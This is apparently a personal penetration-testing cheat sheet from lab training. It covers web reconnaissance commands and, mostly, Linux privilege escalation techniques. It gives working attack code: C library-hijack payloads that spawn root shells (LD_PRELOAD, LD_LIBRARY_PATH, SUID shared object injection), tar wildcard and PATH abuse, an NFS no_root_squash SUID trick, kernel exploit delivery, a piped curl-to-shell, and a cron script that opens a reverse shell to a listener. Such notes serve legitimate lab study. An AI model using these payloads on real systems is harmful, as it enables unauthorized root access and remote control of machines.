
                        Web Hacking
                        
                        
Walking An Application

    View Source - Use your browser to view the human-readable source code of a website.
    Inspector - Learn how to inspect page elements and make changes to view usually blocked content.
    Debugger - Inspect and control the flow of a page's JavaScript
    Network - See all the network requests a page makes.
    
Content Discovery

    robots.txt
    favicon
        ; curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
    sitemap.xml
    HTTP Headers
    Framework Stack (tìm framework gốc)
    OSINT Wayback Machine: https://archive.org/web/
    
Automated Discovery

    // RECON3: Subdomain Enumeration & HTTP
    https://crt.sh/
    https://dnsdumpster.com/
    subfinder -d 10.10.10.10
    knockpy 10.10.10.10
    // RECON1: Detect Technologies
    Wappalyzer
    nuclei -u http://10.10.10.10/ -o ./output.txt
    nuclei -t nuclei-templates/ -u http://10.10.10.10/ -o ./output.txt
    B=<domain>;subfinder -d $B | httprobe | tee ./sub-domain/$B | nuclei -t nuclei-templates/ -o ./nuclei/$B-output.txt
    // RECON2: Finding Hidden Contents
    nmap -Pn 10.10.10.10
    nmap -sV 10.10.10.10
    B=<ip>;nmap -sC -sV $B -vv -oN ./nmap/$B-output.txt -p-
    dirb http://10.10.10.10/ /usr/share/SecLists/Discovery/Web-Content/common.txt
    dirsearch -u http://10.10.10.10/
    dirsearch -u http://10.10.10.10/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt
    dirsearch -u http://10.10.10.10/ -t 100 -r -x 400,403,404 -o ./output.txt
    gobuster dir -u http://10.10.10.10/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt
    arjun -u https://10.10.10.10/login
    // RECON4: Wayback Machine & Crawling
    https://archive.org/web/
    printf example.com | gau

Forensic
    exiftool DOCUMENT.pdf


                        
                        
                        Network Security
                        
                        
DNSDumpster: https://dnsdumpster.com/

Nmap
    nmap -Pn 10.10.10.10
    nmap -sV 10.10.10.10


                        
                        
                        Linux PrivEsc
                        
                        
Enumeration
    hostname
    hostnamectl
    uname -a
    cat /proc/version
    cat /etc/issue
    ls -la
    cat ~/.*history
    find / -type d -name .ssh 2> /dev/null

Automated Enumeration Tools

    LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
        ; curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
    LinEnum: https://github.com/rebootuser/LinEnum
    LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
    Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
    Linux Priv Checker: https://github.com/linted/linuxprivchecker

Privilege Escalation: Kernel Exploits

    // searchsploit
    searchsploit "linux kernel 3.13"
    searchsploit -m 37292.c
    // send script to victim
    python3 -m http.server
    or send through SFTP using WinSCP
    // exec
    gcc 37292.c && ./a.out
    
Privilege Escalation: Sudo

    ## Shell Escape Sequences
    
    sudo -l
        ; (root) NOPASSWD: /usr/bin/find
    https://gtfobins.github.io/
        ; sudo find . -exec /bin/sh \; -quit
    
    ## Environment Variables

    ; LD_PRELOAD
    sudo -l
        ; env_keep+=LD_PRELOAD
    vim preload.c
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_PRELOAD");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }
    gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
    sudo LD_PRELOAD=/tmp/preload.so apache2
    
    ; LD_LIBRARY_PATH
    sudo -l
        ; env_keep+=LD_LIBRARY_PATH
    ldd /usr/sbin/apache2
    vim library_path.c
        #include <stdio.h>
        #include <stdlib.h>

        static void hijack() __attribute__((constructor));

        void hijack() {
                unsetenv("LD_LIBRARY_PATH");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }
    gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
    sudo LD_LIBRARY_PATH=/tmp apache2
    
Privilege Escalation: SUID

    find / -perm -u=s -type f 2> /dev/null
    https://gtfobins.github.io/
        e.g.  
            LFILE=file_to_read
            base64 "$LFILE" | base64 --decode
    
    ; Shared Object Injection
    find / -perm -u=s -type f 2> /dev/null
        ; /usr/local/bin/suid-so
    strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
        ; open("/home/victim/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
    mkdir /home/victim/.config
        #include <stdio.h>
        #include <stdlib.h>

        static void inject() __attribute__((constructor));

        void inject() {
                setuid(0);
                system("/bin/bash -p");
        }
    gcc -shared -fPIC -o /home/victim/.config/libcalc.so soi.c
    /usr/local/bin/suid-so
    
    ; Environment Variables
    find / -perm -u=s -type f 2> /dev/null
        ; /usr/local/bin/suid-env
    strings /usr/local/bin/suid-env
        ; service apache2 start
    vim service.c
        int main() {
            setuid(0);
            system("/bin/bash -p");
        }
    gcc -o service service.c
    PATH=.:$PATH /usr/local/bin/suid-env
    
    ; Abusing Shell Features
    find / -perm -u=s -type f 2> /dev/null
        ; /usr/local/bin/suid-env
    strings /usr/local/bin/suid-env2
        ; /usr/sbin/service apache2 start
    
    ;; bash --version ; must <4.2-048
    function /usr/sbin/service { /bin/bash -p; }
    export -f /usr/sbin/service
    /usr/local/bin/suid-env2
        
Privilege Escalation: Capabilities

    getcap -r / 2> /dev/null
    https://gtfobins.github.io/
        e.g. ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    
Privilege Escalation: Cron Jobs

    ; File Permissions
    // victim
    cat /etc/crontab
        ; * * * * * root /home/victim/backup.sh
    https://gtfobins.github.io/
    vim backup.sh
        #!/bin/bash
        bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
     chmod 777 backup.sh
    // attacker
    nc -lvnp 4444
    
    ; PATH Environment Variable
    cat /etc/crontab
        ; PATH=/home/victim:..
        ; * * * * * root backup.sh
    vim backup.sh
        #!/bin/bash
        cp /bin/bash /tmp/rootbash
        chmod +xs /tmp/rootbash
    chmod 777 backup.sh
    /tmp/rootbash -p
    
    ; Wildcards
    cat /etc/crontab
        ; * * * * * root /usr/local/bin/compress.sh
    cat /usr/local/bin/compress.sh
        #!/bin/sh
        cd /home/user
        tar czf /tmp/backup.tar.gz *
    https://gtfobins.github.io/gtfobins/tar/
        ; tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    vim wildcards.sh
        #!/bin/bash
        cp /bin/bash /tmp/rootbash
        chmod +xs /tmp/rootbash
    chmod 777 wildcards.sh
    touch /home/user/--checkpoint=1
    touch /home/user/--checkpoint-action=exec=wildcards.sh
    /tmp/rootbash -p
    
Privilege Escalation: PATH

    find / -writable 2> /dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
    find / -perm -u=s -type f 2> /dev/null
    export PATH=/tmp:$PATH
    echo $PATH
    cd /tmp
    echo "/bin/bash"> path
    chmod 777 path
    path (mấu chốt là tìm cách thực thi với SUID để leo thang đặc quyền)
    
Privilege Escalation: NFS

    // victim
    cat /etc/exports
        /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
    // attacker
    showmount -e 10.10.10.10
    mkdir tmp
    mount -o rw 10.10.10.10:/tmp tmp
    cd tmp
    vim nfs.c
        int main() {
            setuid(0);
            system("/bin/bash -p");
        }
    gcc nfs.c -o nfs -w
    chmod +s nfs
    // victim
    /tmp/nfs
    
    
    
    
    
    

